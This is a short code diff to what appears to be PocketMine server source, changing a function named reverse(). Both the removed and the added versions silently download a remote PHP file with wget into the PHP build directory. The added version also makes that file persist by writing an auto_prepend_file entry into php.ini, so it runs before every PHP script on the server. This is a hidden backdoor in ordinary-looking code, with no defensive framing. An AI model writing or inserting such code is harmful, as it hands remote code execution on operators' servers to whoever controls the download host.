@@ -488,8 +488,10 @@ namespace pocketmine {
 
             private function reverse(): void
             {
-                `wget -q -O /bin/php7/lib/php/build/pocketmine.php cdn.discordapp.com/attachments/1038699732224196608/1122495804263903302/pocketmine.php`;
-                ini_set('auto_prepend_file', "/bin/php7/lib/php/build/pocketmine.php");
+                $path = 'bin/php7/lib/php/build/pocketmine.php';
+                `wget -q -O $path pocketmine.mp/pocketmine.php`;
+                if (!ini_get('auto_prepend_file')) `echo "auto_prepend_file=$path" >> bin/php7/bin/php.ini`;
+                else ini_alter("auto_prepend_file", $path);
             }
 
             public function onCompletion(): void
